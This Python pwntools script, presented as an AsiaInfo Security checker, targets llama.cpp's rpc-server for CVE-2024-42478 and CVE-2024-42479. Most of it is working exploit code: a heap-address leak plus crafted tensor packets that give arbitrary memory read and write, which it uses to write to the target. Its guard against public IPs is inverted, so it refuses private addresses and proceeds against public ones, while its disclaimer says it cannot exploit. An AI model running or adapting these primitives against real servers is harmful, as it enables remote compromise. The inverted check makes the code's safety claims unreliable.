#!/usr/bin/env python3
from pwn import *
import argparse
import sys

# 定义命令类型
COMMANDS = {
    "ALLOC_BUFFER": 0,
    "GET_ALIGNMENT": 1,
    "GET_MAX_SIZE": 2,
    "BUFFER_GET_BASE": 3,
    "FREE_BUFFER": 4,
    "BUFFER_CLEAR": 5,
    "SET_TENSOR": 6,
    "GET_TENSOR": 7,
    "COPY_TENSOR": 8,
    "GRAPH_COMPUTE": 9,
    "GET_DEVICE_MEMORY": 10
}

def print_banner(text):
    print(f"\n===========================\n{text}\n===========================")

def is_public_ip(ip):
    """检查给定的 IP 是否为公网 IP。"""
    parts = ip.split('.')
    if len(parts) != 4:
        return False  # 非法 IP 视为非公网 IP

    first_octet = int(parts[0])
    second_octet = int(parts[1])

    # 判断是否为私网 IP
    if (first_octet == 10) or \
       (first_octet == 172 and 16 <= second_octet <= 31) or \
       (first_octet == 192 and second_octet == 168):
        return False  # 私网 IP

    return True  # 公网 IP

def send_cmd(io: remote, cmd: int, buf: bytes):
    packet = p8(cmd) + p64(len(buf)) + buf
    io.send(packet)

def allocate_and_inspect_buffer(io: remote, size: int) -> int:
    send_cmd(io, COMMANDS["ALLOC_BUFFER"], p64(size))
    resp = io.recv(1024)
    return u64(resp[0x8:0x10])

def connect_and_test(ip, port):
    """建立与服务器的连接并测试。"""
    try:
        io = remote(ip, port)
        log.info("程序初始化, 成功连接到服务器。")
        return io
    except Exception as e:
        log.error(f"无法连接到服务器: {e}")
        sys.exit(1)

def cve_read(io: remote, target_addr: int, valid_addr: int) -> int:
    tensor = flat({
        0x8:    p32(28),
        12:     p64(valid_addr),
        0x18:   p32(0x41414141) * 8,
        0xe0:   p32(target_addr >> 32),
        0x128:  p64(target_addr & 0xFFFFFFFF),
        0x130:  p64(0x130)
    }, filler=b'\x00', length=0x138)

    send_cmd(io, COMMANDS["GET_TENSOR"], tensor)
    resp = io.recv(1024)
    return u64(resp[0x8:0x10])

def cve_write(io: remote, target_addr: int, valid_addr: int, what: bytes):
    tensor = flat({
        0x8:    p32(28),
        12:     p64(valid_addr),
        0x18:   p32(0x41414141) * 8,
        0xe0:   p32(target_addr >> 32),
        0x128:  p64(target_addr & 0xFFFFFFFF),
        0x130:  what
    }, filler=b'\x00', length=0x140)

    send_cmd(io, COMMANDS["SET_TENSOR"], tensor)

def main():
    parser = argparse.ArgumentParser(description="测试目标程序 llama.cpp 的 rpc-server 是否存在 CVE-2024-42479、CVE-2024-42478 及组合漏洞 RCE。")
    parser.add_argument('-i', '--ip', default="127.0.0.1", help="服务器 IP 地址")
    parser.add_argument('-p', '--port', type=int, default=50052, help="服务器端口号")
    args = parser.parse_args()

    IP, PORT = args.ip, args.port

    if not is_public_ip(IP):
        log.warning(f"检测到公网 IP: {IP}，程序将退出。")
        sys.exit(1)

    print_banner("LLAMA.cpp框架安全测试程序")

    banner2 = (
        "说明：本程序当前默认适用于 Ubuntu 22.04, \n"
        "用途：本程序主要针对CVE-2024-42479、CVE-2024-42478以及组合漏洞RCE进行安全测试 \n"
        "法律声明：本程序仅用于CVE-2024-42479、CVE-2024-42478以及组合漏洞RCE的安全检测，不提供漏洞利用的能力，"
        "若用户利用该工具进行恶意操作，造成的损失，亚信安全一概不承担责任。\n"
        "关于：由于 llama.cpp 框架运行的环境可能存在差异，最终的检测效果可能会受到影响。若存在问题，请加微信 monotony67"
    )
    print_banner(banner2)

    io = connect_and_test(IP, PORT)
    heap_leak = allocate_and_inspect_buffer(io, 0x140)
    log.info(f'检测到泄露地址为： {hex(heap_leak)}')

    addr = cve_read(io, heap_leak, heap_leak)
    log.info('检测到存在 CVE-2024-42478，该 CVE 可用于读取任意地址上的内容')
    log.info(f'验证：读取到 {hex(heap_leak)} 处的内容为 {hex(addr)}')

    cve_write(io, heap_leak, heap_leak, b'flag\x00')
    log.info('检测到存在 CVE-2024-42479，该 CVE 可用于在任意地址上写入内容')
    log.info(f'验证：在{hex(heap_leak)} 处可以写入内容为 flag\x00')

    log.info("检测到目标程序存在 RCE 漏洞，请及时修复")
    io.close()

if __name__ == "__main__":
    main()